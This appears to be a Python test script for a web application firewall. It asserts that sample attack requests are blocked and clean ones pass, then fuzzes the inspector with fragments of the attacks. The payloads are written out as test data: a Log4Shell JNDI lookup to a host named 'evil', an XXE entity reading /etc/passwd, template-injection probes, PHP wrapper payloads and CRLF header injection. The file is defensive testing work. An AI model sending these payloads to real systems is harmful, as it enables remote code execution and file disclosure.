import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'engine'))

from waf import inspect

VECTORS = [
    ('GET', '/{{7*7}}', {}, b'', 'ssti-mustache'),
    ('POST', '/x', {}, b'#{user.name}', 'ssti-hash'),
    ('POST', '/x', {}, b'${jndi:ldap://evil/x}', 'log4shell-jndi'),
    ('POST', '/x', {}, b'<!ENTITY xxe SYSTEM "file:///etc/passwd">', 'xxe-entity'),
    ('GET', '/f?x=*{cmd}', {}, b'', 'ssti-star'),
    ('GET', '/f?file=php://filter/convert.base64-encode/resource=index', {}, b'', 'php-wrapper'),
    ('GET', '/f?x=expect://id', {}, b'', 'php-wrapper'),
    ('GET', '/ok', {'X-N': 'a\r\nInjected: 1'}, b'', 'header-crlf'),
]

CLEAN = [
    ('GET', '/hi', {'Host': 'h'}, b''),
    ('POST', '/api/t', {'Content-Type': 'application/json'}, b'{"a": 1}'),
    ('GET', '/files/report-2024.pdf', {}, b''),
    ('GET', '/s?q={{notemplate}}'.replace('{', '(').replace('}', ')'), {}, b''),
]

n = 0


def check(cond, msg):
    global n
    assert cond, msg
    n += 1


for m, t, h, b, rid in VECTORS:
    v, got = inspect(m, t, h, b)
    check(v == 'deny' and got == rid, '%s %s want %s got %s/%s' % (m, t, rid, v, got))

for m, t, h, b in CLEAN:
    v, got = inspect(m, t, h, b)
    check(v == 'allow', 'clean blocked: %s %s -> %s/%s' % (m, t, v, got))

check(inspect(None, None, None, None) == ('allow', None), 'nones allow')
check(inspect('GET', '/ok', {}, b'\n\n\n') == ('allow', None), 'multiline body allow')

import random
random.seed(7)
pool = b''.join(v[1].encode() + v[3] for v in VECTORS)
for _ in range(300):
    i = random.randrange(len(pool))
    j = i + random.randrange(1, 40)
    inspect('GET', '/', {}, pool[i:j])

print('WAF2 ALL GREEN (%d asserts)' % n)
